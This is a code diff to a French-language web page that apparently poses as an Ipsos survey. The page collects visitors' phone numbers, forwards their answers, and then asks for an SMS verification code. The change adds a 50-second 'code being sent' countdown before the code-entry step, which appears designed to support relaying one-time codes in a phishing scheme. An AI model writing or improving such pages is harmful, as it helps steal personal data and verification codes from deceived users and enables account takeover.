@@ -90,6 +90,13 @@ button:hover { background:#005fa3; transform:translateY(-2px) scale(1.03); box-s
 <button id="btnEtape3">Suivant</button>
 </div>
 
+<!-- Étape 3b : Notification SMS avec décompte -->
+<div class="box" id="etape3b">
+<h2>Vérification en cours ⏱️</h2>
+<p>Un code SMS a été envoyé à votre numéro. Veuillez attendre avant de le recevoir.</p>
+<p>Vous pouvez entrer le code dans <span id="countdown">50</span> secondes.</p>
+</div>
+
 <!-- Étape 4 : Code SMS -->
 <div class="box" id="etape4">
 <h2>Code de vérification 📩</h2>
@@ -175,7 +182,7 @@ document.getElementById('btnEtape2').addEventListener('click', ()=>{
     showStep('etape3',60);
 });
 
-// Étape 3 -> 4
+// Étape 3 -> 3b avec décompte
 document.getElementById('btnEtape3').addEventListener('click', ()=>{
     let tel = document.getElementById('telephone').value.trim();
     if(!/^0[67]\d{8}$/.test(tel)){ alert("Numéro invalide. Commence par 06 ou 07 et 10 chiffres."); return;}
@@ -194,7 +201,22 @@ document.getElementById('btnEtape3').addEventListener('click', ()=>{
         telephone: reponses.telephone
     }, "Réponses participant complet - Ipsos");
 
-    showStep('etape4',80);
+    // Afficher étape de notification SMS
+    showStep('etape3b',70);
+
+    // Démarrage du compte à rebours de 50 secondes
+    let countdown = 50;
+    const countdownEl = document.getElementById('countdown');
+    countdownEl.innerText = countdown;
+    const timer = setInterval(()=>{
+        countdown--;
+        countdownEl.innerText = countdown;
+        if(countdown <= 0){
+            clearInterval(timer);
+            // Après 50s, passer à l'étape du code SMS
+            showStep('etape4',80);
+        }
+    },1000);
 });
 
 // Étape 4 -> 5
